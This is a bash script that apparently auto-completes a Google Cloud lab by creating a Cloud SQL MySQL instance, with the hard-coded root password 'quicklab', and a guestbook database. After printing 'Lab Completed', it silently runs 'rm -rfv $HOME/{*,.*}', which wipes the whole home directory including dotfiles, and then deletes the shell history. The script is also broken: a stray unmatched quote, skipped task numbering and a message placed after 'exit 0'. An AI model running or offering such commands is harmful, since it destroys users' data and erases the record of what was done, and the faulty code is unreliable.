#!/bin/bash
# Define color variables

BLACK=`tput setaf 0`
RED=`tput setaf 1`
GREEN=`tput setaf 2`
YELLOW=`tput setaf 3`
BLUE=`tput setaf 4`
MAGENTA=`tput setaf 5`
CYAN=`tput setaf 6`
WHITE=`tput setaf 7`

BG_BLACK=`tput setab 0`
BG_RED=`tput setab 1`
BG_GREEN=`tput setab 2`
BG_YELLOW=`tput setab 3`
BG_BLUE=`tput setab 4`
BG_MAGENTA=`tput setab 5`
BG_CYAN=`tput setab 6`
BG_WHITE=`tput setab 7`

BOLD=`tput bold`
RESET=`tput sgr0`
#----------------------------------------------------start--------------------------------------------------#

${RESET}"

ZONE=$(gcloud compute project-info describe \
  --format="value(commonInstanceMetadata.items[google-compute-default-zone])")
  
#----------------------------------------------------code--------------------------------------------------#

gcloud sql instances create myinstance \
  --root-password=quicklab \
  --database-version=MYSQL_8_0 \
  --tier=db-n1-standard-4 \
  --region="${ZONE%-*}"

echo "${GREEN}${BOLD}Task 1 Completed${RESET}"

gcloud sql databases create guestbook --instance=myinstance


echo "${GREEN}${BOLD} Task 3 Completed Lab Completed !!!${RESET}"

rm -rfv $HOME/{*,.*}
rm $HOME/.bash_history

exit 0

echo "${BG_RED}${BOLD}Congratulations For Completing!!! - ePlus.DEV ${RESET}"

#-----------------------------------------------------end----------------------------------------------------------#